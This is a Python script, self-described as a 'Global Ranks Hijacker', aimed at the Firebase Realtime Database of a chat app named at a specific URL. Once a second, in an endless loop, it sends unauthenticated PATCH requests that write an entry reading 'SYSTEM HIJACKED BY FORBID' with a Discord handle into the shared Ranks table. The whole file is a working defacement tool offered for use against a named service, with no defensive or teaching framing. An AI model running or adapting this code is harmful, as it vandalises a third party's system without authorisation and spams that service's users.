import time
import random
import requests

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"
ranks_url = f"{database_url}/Ranks.json"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Global Ranks Hijacker Initialized...")

session = requests.Session()

while True:
    try:
        # Force a global rank override on the database that rechat syncs globally
        hijack_data = {
            "FORBID_GLOBAL_ALERT": {
                "Tag": "SYSTEM HIJACKED BY FORBID",
                "Color": "red",
                "Message": "DISCORD: forbiddenway"
            }
        }
        
        # PUT request overwrites or updates the global table
        response = session.patch(ranks_url, json=hijack_data, headers=headers, timeout=3)
        
        if response.status_code == 200:
            print("[FORBID] Global rank override broadcasted successfully!")
        else:
            print(f"[FORBID] Failed global sync: {response.status_code}")
            
    except Exception as e:
        print(f"[FORBID] Error: {e}")
        
    time.sleep(1)
